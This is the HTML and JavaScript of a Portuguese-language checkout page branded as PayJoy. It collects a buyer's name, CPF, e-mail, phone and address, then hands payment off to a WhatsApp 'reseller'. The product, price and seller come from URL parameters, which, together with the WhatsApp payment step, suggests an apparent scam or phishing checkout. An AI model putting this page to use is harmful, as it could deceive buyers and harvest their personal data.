<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout</title>

<style>
body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #f4f4f4;
}

header {
    background-color: #0b7a3c;
    height: 72px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 16px;
    color: #fff;
}

header img { height: 44px; }

.seller-name {
    font-size: 14px;
    font-weight: bold;
}

.container {
    background: #fff;
    margin: 12px;
    padding: 18px;
    border-radius: 14px;
}

.type-select {
    display: flex;
    gap: 10px;
    margin-bottom: 18px;
}

.type {
    flex: 1;
    padding: 14px;
    text-align: center;
    border-radius: 10px;
    border: 2px solid #0b7a3c;
    font-weight: bold;
    cursor: pointer;
}

.type.active {
    background: #0b7a3c;
    color: #fff;
}

.product {
    display: flex;
    gap: 14px;
    margin-bottom: 16px;
}

.product img {
    width: 120px;
    border-radius: 10px;
}

.field {
    margin-bottom: 14px;
}

.field label {
    font-size: 14px;
    display: block;
    margin-bottom: 6px;
}

.field input,
.field select {
    width: 100%;
    padding: 14px;
    font-size: 16px;
    border-radius: 10px;
    border: 1px solid #ccc;
}

.info-box {
    background: #f0fdf4;
    padding: 14px;
    border-radius: 10px;
    margin-bottom: 16px;
    font-size: 14px;
}

.button {
    width: 100%;
    padding: 16px;
    background: #0b7a3c;
    color: #fff;
    border: none;
    border-radius: 12px;
    font-size: 17px;
    font-weight: bold;
    cursor: pointer;
}

.explain {
    font-size: 13px;
    color: #444;
    margin: 12px 0;
    text-align: center;
}

footer {
    background-color: #0b7a3c;
    color: #fff;
    padding: 22px 0;
    text-align: center;
    margin-top: 16px;
}

footer span {
    font-size: 12px;
    display: block;
    margin-top: 8px;
}

footer img {
    width: 90px;
    margin-top: 10px;
}
</style>
</head>

<body>

<header>
  <img src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg">
  <div class="seller-name" id="sellerName"></div>
</header>

<div class="container">

  <div class="type-select">
    <div class="type active">Sou comprador</div>
    <a href="revender.html" class="type">Sou revendedor</a>
  </div>

  <div class="product">
    <img id="prodImg">
    <div>
      <strong id="prodName"></strong><br>
      Valor total: <strong>R$ <span id="prodPrice"></span></strong>
    </div>
  </div>

  <div class="field">
    <label>Parcelamento</label>
    <select id="parcelas"></select>
  </div>

  <div class="info-box">
    Entrada mínima (12%): <strong>R$ <span id="entrada"></span></strong>
  </div>

  <div class="field"><label>Nome completo</label><input id="nome"></div>
  <div class="field"><label>E-mail</label><input id="email"></div>
  <div class="field"><label>Telefone</label><input id="telefone"></div>
  <div class="field"><label>CPF</label><input id="cpf"></div>
  <div class="field"><label>CEP</label><input id="cep"></div>
  <div class="field"><label>Rua</label><input id="rua"></div>

  <!-- NOVO CAMPO -->
  <div class="field"><label>Número da residência</label><input id="numero"></div>

  <div class="field"><label>Bairro</label><input id="bairro"></div>

  <div class="explain">
    Ao clicar em <strong>Finalizar no WhatsApp</strong>, você será direcionado para um
    revendedor autorizado que dará continuidade ao processo de pagamento.
  </div>

  <button class="button" onclick="finalizar()">Finalizar no WhatsApp</button>

</div>

<footer>
  <span>© 2026 PayJoy — CNPJ 41.069.116/0001-64</span>
  <img src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg">
</footer>

<script>
const params = new URLSearchParams(window.location.search);
const product = params.get("name");
const price = parseFloat(params.get("price"));
const img = params.get("img");
const seller = params.get("seller");

sellerName.innerText = "Revendedor: " + seller;
prodName.innerText = product;
prodPrice.innerText = price.toFixed(2).replace(".", ",");
prodImg.src = img;

const entrada = price * 0.12;
entradaSpan = document.getElementById("entrada");
entradaSpan.innerText = entrada.toFixed(2).replace(".", ",");

const parcelasSelect = document.getElementById("parcelas");
[1,6,12,18,24].forEach(p => {
  const opt = document.createElement("option");
  opt.value = p;
  opt.innerText = `${p}x de R$ ${(price/p).toFixed(2).replace(".", ",")}`;
  parcelasSelect.appendChild(opt);
});

cep.onblur = () => {
  fetch(`https://viacep.com.br/ws/${cep.value}/json`)
    .then(r => r.json())
    .then(d => {
      rua.value = d.logradouro || "";
      bairro.value = d.bairro || "";
    });
};

function maskName(name){
  const first = name.split(" ")[0];
  return first + "****";
}

function maskCPF(cpf){
  return cpf.substring(0,3) + ".***.***-" + cpf.slice(-2);
}

function finalizar(){

  if (
    !nome.value ||
    !email.value ||
    !telefone.value ||
    !cpf.value ||
    !cep.value ||
    !rua.value ||
    !numero.value ||
    !bairro.value
  ) {
    alert("Por favor, preencha todos os campos para continuar.");
    return;
  }

  const url =
`finalizar.html?
seller=${encodeURIComponent(seller)}
&buyer=${encodeURIComponent(maskName(nome.value))}
&cpf=${encodeURIComponent(maskCPF(cpf.value))}
&email=${encodeURIComponent(email.value)}
&phone=${encodeURIComponent(telefone.value)}
&street=${encodeURIComponent(rua.value + ", " + numero.value)}
&parcelas=${parcelas.value}
&price=${price}
&entrada=${entrada.toFixed(2)}
&product=${encodeURIComponent(product)}`;

  window.location.href = url;
}
</script>

</body>
</html>
